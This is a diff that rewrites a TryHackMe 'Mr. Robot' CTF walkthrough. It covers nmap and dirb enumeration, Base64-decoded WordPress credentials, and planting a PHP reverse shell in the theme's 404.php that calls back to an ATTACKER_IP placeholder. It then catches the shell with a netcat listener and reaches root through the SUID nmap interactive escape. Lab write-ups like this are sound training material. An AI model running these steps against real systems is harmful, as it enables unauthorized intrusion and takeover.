@@ -1,112 +1,334 @@
-##Mr Robot CTF : https://tryhackme.com/room/mrrobot
+# Mr. Robot CTF Walkthrough
+
+## Overview
+
+This walkthrough demonstrates how the **Mr. Robot** challenge on TryHackMe was solved. The room simulates a realistic penetration testing scenario in a legal and controlled Capture The Flag (CTF) environment.
 
 ---
 
-start with scan the IP using Nmap :
-we found 3 port open :
+## Reconnaissance
 
-* *22 --> ssh*
-* *80 --> http*
-* *443 --> https*
+The first step was to identify the open services running on the target machine.
 
-![img](Screenshots/)
-
-get the ip and open the firefox browser, and if can get any useful thing
-
-we find only record message and videos
-
-![img](Screenshots/)
-
-find subdomans of this ip :
-we many methods to find subdomans :
-
-1- using "drib"
+### Nmap Scan
 
 ```bash
-dirb URL_of_Target
+nmap -sV <TARGET_IP>
+````
+
+The scan revealed three open ports:
+
+| Port | Service |
+| ---- | ------- |
+| 22   | SSH     |
+| 80   | HTTP    |
+| 443  | HTTPS   |
+
+![Nmap Scan](Screenshots/Scan_Network_Nmap.png)
+
+Since web services were available, the next step was to investigate the website.
+
+---
+
+## Web Enumeration
+
+After opening the target in a browser, the homepage displayed only a video and a message inspired by the Mr. Robot series.
+
+![Homepage](Screenshots/homepage.png)
+
+Although nothing immediately useful was visible, hidden files and directories often contain valuable information.
+
+### Directory Enumeration
+
+We used Dirb to enumerate hidden directories:
+
+```bash
+dirb http://<TARGET_IP>
 ```
 
-![img](Screenshots/)
+Alternatively:
 
-you can also use gobuster 
+```bash
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+```
 
-after finding subdomains search in it to find any useful thing to use:
+![Dirb Results](Screenshots/dirb.png)
 
-we find many usefull domain :
+Several interesting paths were discovered:
 
-login-page: in it when we write username and password it response if user valid or invalid
+```text
+/robots.txt
+/wp-login
+/license
+```
 
-![img](Screenshots/)
+---
 
-robot : in this subdomain we find first key(flag) and a list can use to make brute force in login page
-license : find in it hash "ZWxsaW90OkVSMjgtMDY1Mgo="
+## robots.txt
 
-![img](Screenshots/)
+Visiting the robots file revealed:
 
-the hash --> I knew that is encryption by "base64" because the text ends with an equals sign (=), which is the distinctive symbol used as padding in the Base64 encoding system when the text isn’t divisible by 3 bytes.
+* The first flag
+* A useful wordlist
 
-decoding it
+```text
+key-1-of-3.txt
+fsocity.dic
+```
+
+![Robots File](Screenshots/robots.png)
+
+The file `key-1-of-3.txt` contained the first flag.
+
+---
+
+## License Page Analysis
+
+The `/license` page contained the following encoded string:
+
+```text
+ZWxsaW90OkVSMjgtMDY1Mgo=
+```
+
+The string appeared to be Base64 encoded because it ended with "=" padding characters.
+
+### Decoding
+
 ```bash
 echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
 ```
 
-![img](Screenshots/)
+Output:
 
-the result is amazing I am get user and password --> when i try it login as admin
-
-![img](Screenshots/)
-
-then we have an admin permission so we can go directly to appearance editor theme because :
-
-* Direct Code Execution: WordPress allows Admins to edit .php files directly, letting us run system commands on the server.
-* Predictable File Paths: Themes use known directories (wp-content/themes/), making our reverse shell easy to find and trigger.
-* Safe Stealth Trigger: Modifying 404.php executes the shell via any broken link without breaking the website.
-
-![img](Screenshots/)
-
-now write a reverse shell can make connect by it to the server 
-```bash
-locate reverse-shell
+```text
+elliot:ER28-0652
 ```
 
-you can find a reverse shell code in the kali at path : /usr/share/webshells/php/php-reverse-shell.php
+![License Page](Screenshots/license.png)
+
+The decoded value provided valid WordPress credentials.
+
+---
+
+## WordPress Login
+
+Using the discovered credentials, we authenticated to the WordPress administration panel.
+
+```text
+Username: elliot
+Password: ER28-0652
+```
+
+![WordPress Login](Screenshots/login.png)
+
+After logging in, we gained administrator access.
+
+---
+
+## Obtaining Remote Code Execution
+
+As administrators, WordPress allows direct editing of theme files.
+
+Navigate to:
+
+```text
+Appearance → Theme Editor
+```
+
+Open:
+
+```text
+404.php
+```
+
+### Why 404.php?
+
+* Administrators can modify PHP files directly.
+* PHP code executes on the server.
+* Theme directories are predictable.
+* The shell can be triggered by visiting a non-existent page.
+
+![Theme Editor](Screenshots/theme-editor.png)
+
+---
+
+## Reverse Shell
+
+Kali Linux contains a PHP reverse shell:
+
+```bash
+locate php-reverse-shell.php
+```
+
+Path:
+
+```text
+/usr/share/webshells/php/php-reverse-shell.php
+```
+
+View the file:
+
 ```bash
 cat /usr/share/webshells/php/php-reverse-shell.php
 ```
 
-copy it and paste in 404.php
-then change the ip and port to connected
+Copy the contents into `404.php`.
 
-![img](Screenshots/)
+Modify:
 
-now use netcat 
-```bash
-sudo nc -nlvp <port>
+```php
+$ip = "<ATTACKER_IP>";
+$port = <PORT>;
 ```
 
-![img](Screenshots/)
+Save the file.
 
-when go in the server we try to make a privilege escalation and get root permission 
-try by "sudo -l" but not find any thing
-try with SUID 
+![Reverse Shell Code](Screenshots/reverse-shell-code.png)
+
+---
+
+## Netcat Listener
+
+Start a listener:
+
+```bash
+sudo nc -nlvp <PORT>
+```
+
+Trigger the reverse shell by visiting any non-existent page:
+
+```text
+http://<TARGET_IP>/randompage
+```
+
+![Netcat Listener](Screenshots/netcat.png)
+
+A reverse shell connection should be received.
+
+---
+
+## Shell Stabilization
+
+Upgrade the shell:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+This provides a more interactive terminal.
+
+---
+
+## Privilege Escalation
+
+Check sudo permissions:
+
+```bash
+sudo -l
+```
+
+Nothing useful was found.
+
+Next, search for SUID binaries:
+
 ```bash
 find / -type f -perm -4000 2>/dev/null
 ```
 
-find nmap used as SUID so :
+Among the results:
+
+```text
+/usr/local/bin/nmap
+```
+
+![SUID Enumeration](Screenshots/suid.png)
+
+The machine contained an old vulnerable version of Nmap.
+
+---
+
+## Privilege Escalation via Nmap
+
+Launch interactive mode:
+
 ```bash
-nmap --interaction
+nmap --interactive
+```
+
+Inside Nmap:
+
+```bash
 !sh
-python -c'import pty ; pty.spawn("/bin/bash")'
 ```
-this line " python -c'import pty ; pty.spawn("/bin/bash")' " to appear the command shell
 
-![img](Screenshots/)
-
-you have now a root privilege search to the keys(falgs)
+Verify root access:
 
 ```bash
-find / -name "key-*-of-3.com 2>/dev/null
+id
 ```
 
-![img](Screenshots/)
+Output:
+
+```text
+uid=0(root) gid=0(root)
+```
+
+![Root Shell](Screenshots/root-shell.png)
+
+Root privileges were successfully obtained.
+
+---
+
+## Finding the Remaining Flags
+
+Search for all flag files:
+
+```bash
+find / -name "key-*" 2>/dev/null
+```
+
+Read them:
+
+```bash
+cat key-1-of-3.txt
+cat key-2-of-3.txt
+cat key-3-of-3.txt
+```
+
+![Flags](Screenshots/find_key.png)
+
+Collect all three flags to complete the room.
+
+---
+
+## Attack Path Summary
+
+1. Nmap scan identified open services.
+2. Directory enumeration revealed hidden files.
+3. robots.txt exposed the first flag and a wordlist.
+4. The license page contained Base64-encoded credentials.
+5. Credentials provided WordPress administrator access.
+6. Theme editing enabled remote code execution.
+7. A reverse shell was obtained using Netcat.
+8. SUID enumeration identified a vulnerable Nmap binary.
+9. Nmap interactive mode provided root access.
+10. The remaining flags were collected.
+
+---
+
+## Skills Practiced
+
+* Nmap Scanning
+* Directory Enumeration
+* WordPress Exploitation
+* Credential Discovery
+* Reverse Shells
+* Linux Privilege Escalation
+* SUID Exploitation
+* Post-Exploitation Enumeration
+
+## Conclusion
+
+This room demonstrates a complete penetration testing workflow, including reconnaissance, web enumeration, credential discovery, remote code execution, privilege escalation, and flag retrieval.
+
+
